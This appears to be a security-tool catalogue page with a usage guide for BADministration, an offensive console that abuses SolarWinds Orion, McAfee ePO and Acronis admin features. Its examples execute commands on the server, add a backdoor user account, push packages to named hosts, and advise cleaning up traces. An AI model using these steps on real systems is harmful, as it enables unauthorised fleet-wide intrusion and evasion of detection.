---
name: "badministration"
categories:
  - blackarch-webapp
version: "16.69e4ec2"
homepage: "https://github.com/ThunderGunExpress/BADministration"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: custom:unknonwn
meta-checked: "2026-11-09"
github-repo: "ThunderGunExpress/BADministration"
github-stars: 128
github-pushed: "2023-05-22"
github-archived: false
github-issues: 1
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.0
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# badministration

> Interactive console that turns compromised management platforms into attack pivots — enumerates clients of SolarWinds Orion, McAfee ePO and Acronis, and abuses their admin features for system command execution and package deployment.

*No corpus evidence — derived from upstream documentation (README plus the packaged module sources: prompt names, subcommands and `set_param` options verified in BADministration.py and Modules/).*

## What it's for

Administration applications hold privileged relationships with every client they manage, so a foothold on one is a foothold on the fleet — the "application segmentation" gap this tool is built around. BADministration is a Python cmd-console (Python 2, vendor-API era) with a parent module per platform: Solarwinds (Orion), McAfee (ePO) and Acronis. Each module offers enumeration (list managed clients, deployed packages, tasks) and offensive actions — executing a system command on the Orion server through a malicious alert, or uploading an ePO deployment package and running it on chosen clients. It speaks the platforms' own APIs (orionsdk, mcafee-epo) with credentials you supply; the standalone SWDump .NET helper that scrapes Orion's memory for WMI credentials ships in the repo's Misc directory. Use it after you have admin credentials or a shell on a management box, to answer "what does this thing actually control?" — and then to control it.

## Typical use cases

### Pick a platform module and enumerate its clients

```
python BADministration.py
[BADministration]# show_modules
[BADministration]# solarwinds
[BADministration\solarwinds]# enumerate
[BADministration\solarwinds\enumerate]# set_param target 198.51.100.10
[BADministration\solarwinds\enumerate]# set_param username admin
[BADministration\solarwinds\enumerate]# set_param password Password1
[BADministration\solarwinds\enumerate]# run
```

Outcome: connects to the Orion instance with the given credentials and lists the nodes it manages — the attack surface one hop out. `show_modules` at the top level prints the available parents (`mcafee`, `solarwinds`, `acronis`); inside any action, `show_options` lists the parameters and `set_param <name> <value>` fills them before `run`.

### Execute a system command on the Orion server

```
[BADministration\solarwinds]# system_command
[BADministration\solarwinds\system_command]# set_param target 198.51.100.10
[BADministration\solarwinds\system_command]# set_param username admin
[BADministration\solarwinds\system_command]# set_param password Password1
[BADministration\solarwinds\system_command]# set_param command "net user svc_backup Password1 /add"
[BADministration\solarwinds\system_command]# run
```

Outcome: creates a malicious alert on the Orion server that executes the command, giving code execution on the management host itself. The alert this leaves behind is what `list_alerts` flags and `cleanup` removes afterwards — run the cleanup module before leaving the box.

### Push and run a deployment package through McAfee ePO

```
[BADministration]# mcafee
[BADministration\mcafee]# upload_package
[BADministration\mcafee\upload_package]# set_param target 198.51.100.20
[BADministration\mcafee\upload_package]# set_param username admin
[BADministration\mcafee\upload_package]# set_param password Password1
[BADministration\mcafee\upload_package]# set_param packagepath /tmp/pkg.zip
[BADministration\mcafee\upload_package]# run
[BADministration\mcafee\upload_package]# back
[BADministration\mcafee]# create_task
[BADministration\mcafee\create_task]# set_param taskname deploy-pkg
[BADministration\mcafee\create_task]# set_param systems HR-WEB-01,HR-DB-01
[BADministration\mcafee\create_task]# run
[BADministration\mcafee\create_task]# back
[BADministration\mcafee]# start_task
[BADministration\mcafee\start_task]# set_param taskname deploy-pkg
[BADministration\mcafee\start_task]# run
```

Outcome: uploads a deployment package built with McAfee's EEDK to ePO, binds it to a client task targeting the named systems, and triggers that task — software deployment as an execution primitive on every managed endpoint. `enumerate`, `list_packages` and `list_tasks` are the matching recon commands inside the same module, and `remove_package`/`remove_task` undo the artifacts.
